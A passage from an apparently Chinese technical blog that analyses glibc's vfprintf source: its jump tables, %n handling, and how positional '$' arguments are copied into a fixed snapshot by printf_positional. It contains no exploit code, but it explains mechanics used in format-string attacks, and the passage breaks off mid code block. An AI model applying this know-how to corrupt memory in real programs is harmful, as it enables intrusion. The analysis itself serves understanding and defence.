class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (*f != L_(<span class="string">&#x27;\0&#x27;</span>));</span><br></pre></td></tr></table></figure><p>其中涉及到的几个跳转表结构都在宏<code>STEP0_3_TABLE</code>以及<code>STEP4_TABLE</code>里，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STEP0_3_TABLE      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 0: at the beginning.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step0_jumps[30] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (flag_space),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_plus),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_minus),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_hash),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_zero),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_quote),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (width_asterics),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (width),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (precision),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_half),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_long),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_longlong),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_size_t),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_ptrdiff_t),      <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_intmax_t),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_i18n),<span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;;</span></span><br><span class="line">    <span class="comment">/* Step 1: after processing width.  */</span>      \</span><br><span class="line">    <span class="type">static</span> JUMP_TABLE_TYPE step1_jumps[<span class="number">30</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Step 2: after processing precision.  */</span>      \</span><br><span class="line">    <span class="type">static</span> JUMP_TABLE_TYPE step2_jumps[<span class="number">30</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Step 3a: after processing first &#x27;h&#x27; modifier.  */</span>      \</span><br><span class="line">    <span class="type">static</span> JUMP_TABLE_TYPE step3a_jumps[<span class="number">30</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Step 3b: after processing first &#x27;l&#x27; modifier.  */</span>      \</span><br><span class="line">    <span class="type">static</span> JUMP_TABLE_TYPE step3b_jumps[<span class="number">30</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEP4_TABLE      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 4: processing format specifier.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step4_jumps[30] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown)        <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br></pre></td></tr></table></figure><p>省略部分基本都长一个样，就是按照顺序，先处理宽度精度等等，在根据特定参数进行操作<br>来分析一下处理流程，以<code>%n</code>为例，在宏<code>process_arg(fspec)</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">LABEL (form_number):      \</span><br><span class="line">      <span class="keyword">if</span> ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>)      \</span><br><span class="line">&#123;      \</span><br><span class="line">  <span class="keyword">if</span> (! readonly_format)      \</span><br><span class="line">    &#123;      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="type">int</span> __readonly_area (<span class="type">const</span> <span class="type">void</span> *, <span class="type">size_t</span>)      \</span><br><span class="line">attribute_hidden;      \</span><br><span class="line">      readonly_format      \</span><br><span class="line">= __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)      \</span><br><span class="line">    * <span class="keyword">sizeof</span> (CHAR_T)));      \</span><br><span class="line">    &#125;      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)      \</span><br><span class="line">    __libc_fatal (<span class="string">&quot;*** %n in writable segment detected ***\n&quot;</span>);      \</span><br><span class="line">&#125;      \</span><br><span class="line">      <span class="comment">/* Answer the count of characters written.  */</span>      \</span><br><span class="line">      <span class="keyword">if</span> (fspec == <span class="literal">NULL</span>)      \</span><br><span class="line">&#123;      \</span><br><span class="line">  <span class="keyword">if</span> (is_longlong)      \</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *) va_arg (ap, <span class="type">void</span> *) = done;      \</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (is_long_num)      \</span><br><span class="line">    *(<span class="type">long</span> <span class="type">int</span> *) va_arg (ap, <span class="type">void</span> *) = done;      \</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (is_char)      \</span><br><span class="line">    *(<span class="type">char</span> *) va_arg (ap, <span class="type">void</span> *) = done;      \</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!is_short)      \</span><br><span class="line">    *(<span class="type">int</span> *) va_arg (ap, <span class="type">void</span> *) = done;      \</span><br><span class="line">  <span class="keyword">else</span>      \</span><br><span class="line">    *(<span class="type">short</span> <span class="type">int</span> *) va_arg (ap, <span class="type">void</span> *) = done;      \</span><br><span class="line">&#125;      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line"><span class="keyword">if</span> (is_longlong)      \</span><br><span class="line">  *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *) args_value[fspec-&gt;data_arg].pa_pointer = done;   \</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_long_num)      \</span><br><span class="line">  *(<span class="type">long</span> <span class="type">int</span> *) args_value[fspec-&gt;data_arg].pa_pointer = done;      \</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_char)      \</span><br><span class="line">  *(<span class="type">char</span> *) args_value[fspec-&gt;data_arg].pa_pointer = done;      \</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!is_short)      \</span><br><span class="line">  *(<span class="type">int</span> *) args_value[fspec-&gt;data_arg].pa_pointer = done;      \</span><br><span class="line"><span class="keyword">else</span>      \</span><br><span class="line">  *(<span class="type">short</span> <span class="type">int</span> *) args_value[fspec-&gt;data_arg].pa_pointer = done;      \</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>看到这里判断 <code>fspec</code> 的状态，为<code>NULL</code>则直接从<code>va_arg(ap, type)</code>来逐个顺序取参，也就是线性的先取寄存器再取栈上参数，并且实时修改完成（**<code>printf</code> 函数利用格式化字符串减去的应该是后五个寄存器，<code>rdi</code> 本身是一个字符串地址，<code>%</code> 占位符解析的是从 <code>rsi</code> 开始的，五个寄存器再加栈内存单元**）<br>如果不为 <code>NULL</code> 则从<code>args_value[index]</code>取参数，这里的<code>index</code>索引是提前确定的。哪里确定呢？当使用 <strong>$</strong> 来确定参数时候，会进入一个特殊的处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep, mode_flags);</span><br><span class="line"></span><br><span class="line"> all_done:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="built_in">free</span> (workstart);</span><br><span class="line">  <span class="comment">/* Unlock the stream.  */</span></span><br><span class="line">  _IO_funlockfile (s);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会调用 <code>printf_positional</code> 函数，这个函数长的要命，不全贴，展示一下关键流程。<br>先是对参数存储区域的初始化，不赘述；然后依次将参数从<code>va_arg</code>放入 <code>args_value[]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fill in the types of all the arguments.  */</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">/* No arguments.  */</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">   type and size.  */</span></span><br><span class="line">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">     all the types.  */</span></span><br><span class="line">  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">    (&amp;specs[cnt].info,</span><br><span class="line">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we know all the types and the order.  Fill in the argument</span></span><br><span class="line"><span class="comment">     values.  */</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)\</span></span><br><span class="line"><span class="meta">case tag:\</span></span><br><span class="line"><span class="meta">  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">  break</span></span><br><span class="line"></span><br><span class="line">T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:<span class="comment">/* Promoted.  */</span></span><br><span class="line">T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:<span class="comment">/* All pointers are the same */</span></span><br><span class="line">T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line"> &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line"><span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">   strings.  We have no way to determine their type.  */</span></span><br><span class="line">assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这相当于建立了一个“参数快照”，也就是保留了此时的全部参数情况，然后重新处理整个<code>fmtstr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line"> <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">   &#123;</span><br><span class="line">     STEP4_TABLE;</span><br><span class="line">     ...</span><br><span class="line">       process_arg ((&amp;specs[nspecs_done]));</span><br><span class="line">    process_string_arg ((&amp;specs[nspecs_done]));</span><br><span class="line">     ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里也是使用了一样的处理的宏，见此前处理流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">process_arg (((<span class="keyword">struct</span> printf_spec *) <span class="literal">NULL</span>));</span><br><span class="line">process_string_arg (((<span class="keyword">struct</span> printf_spec *) <span class="literal">NULL</span>));</span><br><span class="line">...</span><br><span class="line">&#125; <span class="keyword">while</span>();</span><br></pre></td></tr></table></figure><p>但是<code>printf_positional</code>函数传入的 <code>fspec</code> 不再是<code>NULL</code>，而是<code>(&amp;specs[nspecs_done])</code>，此时就会根据 <code>args_value[]</code>来取参数，并且这时候即使对参数做了更改，也不会影响到建立的“参数快照”，这也就解释了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 